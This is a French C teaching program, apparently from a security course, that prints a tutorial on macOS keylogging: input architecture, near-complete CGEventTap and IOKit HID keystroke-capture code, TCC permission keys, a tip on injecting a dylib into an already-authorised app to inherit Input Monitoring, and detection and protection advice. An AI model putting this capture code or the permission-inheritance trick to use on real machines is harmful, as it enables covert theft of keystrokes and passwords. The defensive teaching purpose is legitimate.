/*
 * OBJECTIF  : Comprendre le keylogging sur macOS
 * PREREQUIS : Bases C, CoreGraphics, IOKit, TCC
 * COMPILE   : clang -o example example.c -framework CoreGraphics
 *             -framework CoreFoundation
 *
 * Ce programme demontre les techniques de keylogging macOS :
 * CGEventTap, IOKit HID, permissions TCC, et detection.
 * Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

/*
 * Etape 1 : Architecture d'input macOS
 */
static void explain_input_architecture(void) {
    printf("[*] Etape 1 : Architecture d'input macOS\n\n");

    printf("    ┌──────────────────────────────────────────┐\n");
    printf("    │  Hardware (clavier USB/Bluetooth)         │\n");
    printf("    │       │                                   │\n");
    printf("    │       v                                   │\n");
    printf("    │  IOKit HID (kernel driver)               │\n");
    printf("    │  IOHIDManager / IOHIDDevice               │\n");
    printf("    │       │                                   │\n");
    printf("    │       v                                   │\n");
    printf("    │  WindowServer                             │\n");
    printf("    │  (distribue les events aux apps)         │\n");
    printf("    │       │                                   │\n");
    printf("    │       ├──> CGEventTap (interception)     │\n");
    printf("    │       │                                   │\n");
    printf("    │       v                                   │\n");
    printf("    │  Application (NSEvent / CGEvent)         │\n");
    printf("    └──────────────────────────────────────────┘\n\n");

    printf("    Points d'interception possibles :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. CGEventTap   : niveau CoreGraphics\n");
    printf("    2. IOKit HID    : niveau driver\n");
    printf("    3. NSEvent      : niveau application\n");
    printf("    4. Accessibility: niveau systeme\n\n");
}

/*
 * Etape 2 : CGEventTap (methode principale)
 */
static void show_cgeventtap_code(void) {
    printf("[*] Etape 2 : CGEventTap (keylogger principal)\n\n");

    printf("    #include <CoreGraphics/CoreGraphics.h>\n\n");

    printf("    // Callback pour chaque touche\n");
    printf("    CGEventRef callback(CGEventTapProxy proxy,\n");
    printf("                        CGEventType type,\n");
    printf("                        CGEventRef event,\n");
    printf("                        void *refcon) {\n");
    printf("        if (type == kCGEventKeyDown) {\n");
    printf("            CGKeyCode keycode =\n");
    printf("                (CGKeyCode)CGEventGetIntegerValueField(\n");
    printf("                    event, kCGKeyboardEventKeycode);\n\n");
    printf("            // Recuperer le caractere Unicode\n");
    printf("            UniChar chars[4];\n");
    printf("            UniCharCount len;\n");
    printf("            CGEventKeyboardGetUnicodeString(\n");
    printf("                event, 4, &len, chars);\n\n");
    printf("            printf(\"Key: %%c (code: %%d)\\n\",\n");
    printf("                   (char)chars[0], keycode);\n");
    printf("        }\n");
    printf("        return event;\n");
    printf("    }\n\n");

    printf("    // Creation du tap\n");
    printf("    CFMachPortRef tap = CGEventTapCreate(\n");
    printf("        kCGSessionEventTap,         // session\n");
    printf("        kCGHeadInsertEventTap,       // position\n");
    printf("        kCGEventTapOptionDefault,    // actif\n");
    printf("        CGEventMaskBit(kCGEventKeyDown),  // events\n");
    printf("        callback,                    // handler\n");
    printf("        NULL                         // user data\n");
    printf("    );\n\n");

    printf("    // Ajouter au run loop\n");
    printf("    CFRunLoopSourceRef source =\n");
    printf("        CFMachPortCreateRunLoopSource(NULL, tap, 0);\n");
    printf("    CFRunLoopAddSource(CFRunLoopGetCurrent(),\n");
    printf("        source, kCFRunLoopCommonModes);\n");
    printf("    CGEventTapEnable(tap, true);\n");
    printf("    CFRunLoopRun();\n\n");

    printf("    Necessite la permission TCC 'Input Monitoring'\n\n");
}

/*
 * Etape 3 : IOKit HID (niveau driver)
 */
static void show_iokit_hid_code(void) {
    printf("[*] Etape 3 : IOKit HID (niveau driver)\n\n");

    printf("    #include <IOKit/hid/IOHIDManager.h>\n\n");

    printf("    // Creer un HID Manager\n");
    printf("    IOHIDManagerRef mgr = IOHIDManagerCreate(\n");
    printf("        kCFAllocatorDefault, kIOHIDOptionsTypeNone);\n\n");

    printf("    // Filtrer les claviers\n");
    printf("    CFMutableDictionaryRef match =\n");
    printf("        CFDictionaryCreateMutable(...);\n");
    printf("    CFDictionarySetValue(match,\n");
    printf("        CFSTR(kIOHIDDeviceUsagePageKey),\n");
    printf("        CFNumberCreate(NULL, ..., &kHIDPage_GenericDesktop));\n");
    printf("    CFDictionarySetValue(match,\n");
    printf("        CFSTR(kIOHIDDeviceUsageKey),\n");
    printf("        CFNumberCreate(NULL, ..., &kHIDUsage_GD_Keyboard));\n\n");

    printf("    IOHIDManagerSetDeviceMatching(mgr, match);\n\n");

    printf("    // Callback pour les inputs\n");
    printf("    IOHIDManagerRegisterInputValueCallback(\n");
    printf("        mgr, input_callback, NULL);\n\n");

    printf("    IOHIDManagerScheduleWithRunLoop(mgr,\n");
    printf("        CFRunLoopGetMain(), kCFRunLoopDefaultMode);\n");
    printf("    IOHIDManagerOpen(mgr, kIOHIDOptionsTypeNone);\n\n");

    printf("    Avantage : capture avant WindowServer\n");
    printf("    Inconvenient : necessite des privileges\n\n");
}

/*
 * Etape 4 : Permissions TCC
 */
static void explain_tcc_permissions(void) {
    printf("[*] Etape 4 : Permissions TCC pour le keylogging\n\n");

    printf("    Depuis macOS 10.15 (Catalina) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    CGEventTap necessite :\n");
    printf("    - 'Input Monitoring' dans TCC\n");
    printf("    - Ou 'Accessibility' dans TCC\n\n");

    printf("    Service TCC               | Cle\n");
    printf("    ──────────────────────────|──────────────────────\n");
    printf("    Input Monitoring          | kTCCServiceListenEvent\n");
    printf("    Accessibility             | kTCCServiceAccessibility\n");
    printf("    Screen Recording          | kTCCServiceScreenCapture\n\n");

    printf("    Verifier les permissions :\n");
    printf("    ───────────────────────────────────\n");
    printf("    sqlite3 ~/Library/Application\\ Support/\n");
    printf("      com.apple.TCC/TCC.db \\\n");
    printf("      \"SELECT client,auth_value FROM access \\\n");
    printf("       WHERE service='kTCCServiceListenEvent'\"\n\n");

    /* Verifier la base TCC */
    printf("    Verification TCC :\n");
    const char *home = getenv("HOME");
    if (home) {
        char path[512];
        struct stat st;
        snprintf(path, sizeof(path),
                 "%s/Library/Application Support/com.apple.TCC/TCC.db", home);
        if (stat(path, &st) == 0) {
            printf("      TCC.db present (%lld octets)\n", (long long)st.st_size);
        } else {
            printf("      TCC.db non accessible directement\n");
        }
    }
    printf("\n");
}

/*
 * Etape 5 : Techniques avancees
 */
static void explain_advanced_techniques(void) {
    printf("[*] Etape 5 : Techniques avancees\n\n");

    printf("    1. Injection dans une app autorisee :\n");
    printf("    ───────────────────────────────────\n");
    printf("    -> Si une app a deja 'Input Monitoring'\n");
    printf("    -> Injecter une dylib dans cette app\n");
    printf("    -> Le keylogger herite des permissions\n\n");

    printf("    2. AppleScript keylogging :\n");
    printf("    ───────────────────────────────────\n");
    printf("    osascript -e '\n");
    printf("      tell application \"System Events\"\n");
    printf("        keystroke log\n");
    printf("      end tell'\n");
    printf("    -> Necessite Accessibility\n\n");

    printf("    3. Clipboard monitoring :\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Alternative au keylogging\n");
    printf("    NSPasteboard *pb = [NSPasteboard generalPasteboard];\n");
    printf("    NSInteger count = [pb changeCount];\n");
    printf("    // Poller pour les changements\n");
    printf("    // Pas besoin de TCC 'Input Monitoring'\n\n");

    printf("    4. Keycodes macOS importants :\n");
    printf("    ───────────────────────────────────\n");
    printf("    Code | Touche       Code | Touche\n");
    printf("    ─────|──────────    ─────|──────────\n");
    printf("    0x00 | A            0x24 | Return\n");
    printf("    0x01 | S            0x30 | Tab\n");
    printf("    0x02 | D            0x31 | Space\n");
    printf("    0x03 | F            0x33 | Delete\n");
    printf("    0x0D | W            0x35 | Escape\n");
    printf("    0x12 | 1            0x37 | Command\n");
    printf("    0x13 | 2            0x38 | Shift\n\n");
}

/*
 * Etape 6 : Detection et protection
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection et protection\n\n");

    printf("    Detection :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - Verifier les event taps actifs\n");
    printf("    - Surveiller les permissions TCC\n");
    printf("    - Monitorer IOKit HID connections\n");
    printf("    - Endpoint Security events\n\n");

    printf("    Commandes :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Lister les event taps\n");
    printf("    # (pas de commande native, utiliser dtrace)\n");
    printf("    sudo dtrace -n 'pid$target::CGEventTapCreate:entry'\n\n");

    printf("    # Verifier les permissions TCC\n");
    printf("    tccutil reset ListenEvent\n");
    printf("    tccutil reset Accessibility\n\n");

    /* Verifier les peripheriques HID */
    printf("    Peripheriques HID connectes :\n");
    FILE *fp = popen("ioreg -p IOUSB -l 2>/dev/null | "
                     "grep -E '\"Product\"' | head -5", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            line[strcspn(line, "\n")] = '\0';
            printf("      %s\n", line);
        }
        pclose(fp);
    }
    printf("\n");

    printf("    Protection :\n");
    printf("    - Garder TCC restrictif\n");
    printf("    - Auditer les apps avec Input Monitoring\n");
    printf("    - Utiliser un gestionnaire de mots de passe\n");
    printf("    - ReiKey (Objective-See) pour detecter les taps\n");
    printf("    - Ne pas donner Accessibility inutilement\n\n");
}

int main(void) {
    printf("[*] Demo : Keylogger macOS\n\n");

    explain_input_architecture();
    show_cgeventtap_code();
    show_iokit_hid_code();
    explain_tcc_permissions();
    explain_advanced_techniques();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
